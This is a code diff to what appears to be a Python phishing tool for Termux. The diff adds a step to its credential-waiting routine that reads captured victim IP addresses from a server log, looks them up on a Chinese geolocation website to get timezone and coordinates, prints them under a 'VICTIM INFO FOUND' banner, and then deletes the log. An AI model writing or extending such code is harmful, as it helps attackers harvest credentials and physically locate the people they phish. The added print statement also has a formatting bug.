@@ -9,9 +9,11 @@ from time import sleep
 from sys import stdout, exit
 from os import system, path
 import multiprocessing
-from urllib import urlopen
+from urllib import urlopen, quote, unquote
 from platform import architecture
 from wget import download
+from httplib import HTTPConnection
+import re
 
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
 
@@ -143,6 +145,20 @@ def waitCreds():
             print '================================================='.format(RED, END)
            
         creds.close()
+
+        with open('ServerTermux/www/iplog.txt') as creds:
+            lines = creds.read().rstrip()
+        if len(lines) != 0: 
+            resp = unquote(urlopen('https://www.ipip.net/ip.html', quote('ip=' + lines)).read())
+            searchObj = re.search('时区：(.*?) 该地区中心经纬度：(.*?), (.*?)', resp) # This website is a Chinese website, and this sentence means "timezone: .....  longitude and latitude at this area's center: ......, ......"
+            timezone = searchObj.group(1)
+            longitude = searchObj.group(2)
+            latitude = searchObj.group(3)
+            print '======================================================================'.format(RED, END)
+            print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            print ' {0}[ INFO ]{1}:\n {0}Timezone: %s Longitude: %s Latatude: %s{1}'.format(GREEN, END) % timezone, longitude, latitude
+            system('rm -rf ServerTermux/www/iplog.txt && touch ServerTermux/www/iplog.txt')
+            print '======================================================================'.format(RED, END)
 
 def runPEnv():
     system('clear')
